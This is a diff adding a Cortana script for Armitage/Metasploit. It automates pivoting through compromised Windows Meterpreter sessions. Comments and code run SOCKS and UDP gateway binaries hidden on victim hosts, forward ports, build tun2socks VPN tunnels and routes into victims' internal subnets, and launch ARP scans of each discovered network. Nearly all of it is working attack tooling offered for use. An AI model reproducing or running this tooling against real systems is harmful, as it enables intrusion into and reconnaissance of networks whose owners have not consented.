@@ -1,0 +1,120 @@
+# Cortana script to setup auto vpn for TCP/UDP access for external metasploit scans
+#
+#  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa   a
+#  8   8               8               8           8                   8   8
+#  8   8   aaaaaaaaa   8   aaaaa   aaaa8aaaa   aaaa8   aaaaa   aaaaa   8   8
+#  8               8       8   8           8           8   8   8       8   8
+#  8aaaaaaaa   a   8aaaaaaa8   8aaaaaaaa   8aaaa   a   8   8   8aaaaaaa8   8
+#  8       8   8               8           8   8   8   8   8           8   8
+#  8   a   8aaa8aaaaaaaa   a   8   aaaaaaaa8   8aaa8   8   8aaaaaaaa   8   8
+#  8   8               8   8   8       8           8           8       8   8
+#  8   8aaaaaaaaaaaa   8aaa8   8aaaa   8   aaaaa   8aaaaaaaa   8   aaaa8   8
+#  8           8       8   8       8   8       8           8   8           8
+#  8   aaaaa   8aaaa   8   8aaaa   8   8aaaaaaa8   a   a   8   8aaaaaaaaaaa8
+#  8       8       8   8   8       8       8       8   8   8       8       8
+#  8aaaaaaa8aaaa   8   8   8   aaaa8aaaa   8   aaaa8   8   8aaaa   8aaaa   8
+#  8           8   8           8       8   8       8   8       8           8
+#  8   aaaaa   8   8aaaaaaaa   8aaaa   8   8aaaa   8aaa8   aaaa8aaaaaaaa   8
+#  8   8       8           8           8       8   8   8               8   8
+#  8   8   aaaa8aaaa   a   8aaaa   aaaa8aaaa   8   8   8aaaaaaaaaaaa   8   8
+#  8   8           8   8   8   8   8           8               8   8       8
+#  8   8aaaaaaaa   8   8   8   8aaa8   8aaaaaaa8   aaaaaaaaa   8   8aaaaaaa8
+#  8   8       8   8   8           8           8   8       8               8
+#  8   8   aaaa8   8aaa8   aaaaa   8aaaaaaaa   8aaa8   a   8aaaaaaaa   a   8
+#  8   8                   8           8               8               8   8
+#  8   8aaaaaaaaaaaaaaaaaaa8aaaaaaaaaaa8aaaaaaaaaaaaaaa8aaaaaaaaaaaaaaa8aaa8
+#			  
+# by monstream00 modeled after autoarp.cna
+#
+#Meterpreter:
+#execute -f /root/exe/socks.exe -m -d cmd.exe -a '-i192.168.4.129 -e192.168.1.129' -H
+#execute -f /root/exe/badvpn-udpgw.exe -m -d cmd.exe -a '--listen-addr 127.0.0.1:7300' -H
+#
+#Console:
+#openvpn --mktun --dev tun0 --user root
+#ifconfig tun0 up
+#ifconfig tun0 10.0.0.1/24
+#route add -net 192.168.1.0 netmask 255.255.255.0 gw 10.0.0.2 dev tun0
+#badvpn-tun2socks --tundev tun0 --netif-ipaddr 10.0.0.2 --netif-netmask 255.255.255.0 --socks-server-addr 192.168.4.129:1080 --udpgw-remote-server-addr 127.0.0.1:7300
+$LHOSTPORT = 1080;
+$vRouter = 2;
+$vTun = 1;
+$vCount = 0;
+
+on session_sync {
+	if (-iswinmeterpreter $1) {
+		m_cmd($1, "route");
+		m_cmd($1, "portfwd add -l $LHOSTPORT -p 1080 -r 127.0.0.1");
+		m_cmd($1, "execute -f /root/exe/socks.exe -m -d cmd.exe -a '-i127.0.0.1' -H");
+		m_cmd($1, "execute -f /root/exe/badvpn-udpgw.exe -m -d cmd.exe -a '--listen-addr 127.0.0.1:7300' -H");
+		#cmd($console, "load nessus");
+	}
+}
+
+# Step 2. filter networks that we don't need to look at.
+sub cleanup {
+	local('$entry $network $netmask');
+	foreach $entry ($1) {
+		($network, $netmask) = values($entry, @('Subnet', 'Netmask'));
+		if (
+			$network eq "0.0.0.0" || $netmask eq "0.0.0.0" || 
+			$network eq "127.0.0.0" || $netmask eq "255.255.255.255" || 
+			$netmask eq "240.0.0.0" || route($network) !is $null ||
+			route_temp($network, $netmask) isroute $2
+		) {
+			remove();
+		}
+	}
+	return $1;
+}
+
+on meterpreter_route {
+	local('@routes $route');
+	@routes = cleanup(parse_route($3), session_host($1));
+
+	$console = console();
+	println("[*] Setuping AutoVPN on Session $1");
+	cmd($console, "echo [*] `date` Setuping AutoVPN on Session $1 >> /opt/metasploit/msf3/data/armitage/cortana.log");	
+	
+	#moved to onready!! nevermind!!!	
+	#$console = open_console_tab("tun2socksSetup_$1"); #Debug use
+	cmd($console, "openvpn --mktun --dev tun$vCount --user root");
+	cmd($console, "ifconfig tun$vCount up");
+	cmd($console, "ifconfig tun$vCount 10.0.0." . $vTun . "/30");
+
+	foreach $route (@routes) {
+		$subnetip = $route['Subnet'];
+		$netmaskip = $route['Netmask'];
+		if ($subnetip !is $null) {
+			println("[*] route add $subnetip $netmaskip $1");
+			route_add($subnetip, $netmaskip, $1);
+			#sleep(60 * 1000);
+			cmd($console, "ip route add $subnetip" . "/" . "$netmaskip via 10.0.0.$vRouter dev tun$vCount");
+		}
+	}
+	#$consoleDebug = console();
+	#$consoleDebug = open_console_tab("tun2socks_$1"); #Debug use
+	cmd($consoleDebug, "badvpn-tun2socks --tundev tun$vCount --netif-ipaddr 10.0.0.$vRouter --netif-netmask 255.255.255.252 --socks-server-addr 127.0.0.1:$LHOSTPORT --udpgw-remote-server-addr 127.0.0.1:7300");
+	#cmd_async("badvpn-tun2socks --tundev tun$vCount --netif-ipaddr 10.0.0.$vRouter --netif-netmask 255.255.255.252 --socks-server-addr 127.0.0.1:$LHOSTPORT --udpgw-remote-server-addr 127.0.0.1:7300");
+	
+	$LHOSTPORT = $LHOSTPORT + 1;
+	$vRouter = $vRouter + 4;
+	$vTun = $vTun + 4;
+	$vCount = $vCount + 1;
+}
+
+# Step 4. When a new route appears, ARP scan it.
+on route_add {
+	local('$host $mask $gateway');
+	($host, $mask, $gateway) = values(route_info($1), @('host', 'mask', 'gateway'));
+
+	# convert the mask to something we can use.
+	$mask = strlen(strrep(formatNumber([graph.Route ipToLong: $mask], 10, 2), '0', ''));
+
+	println("[*] Discovered $host $+ / $+ $mask -> $gateway $+ . Arp Scanning");
+	#[14:54:40] null value error at autoarp.cna:45
+	$console = console();
+	cmd($console, "echo [*] `date` Discovered $host $+ / $+ $mask -> $gateway $+ . Arp Scanning >> /opt/metasploit/msf3/data/armitage/cortana.log");
+	launch("post", "windows/gather/arp_scanner", %(SESSION => $gateway, RHOSTS => "$host $+ / $+ $mask"));
+	#quit();
+}
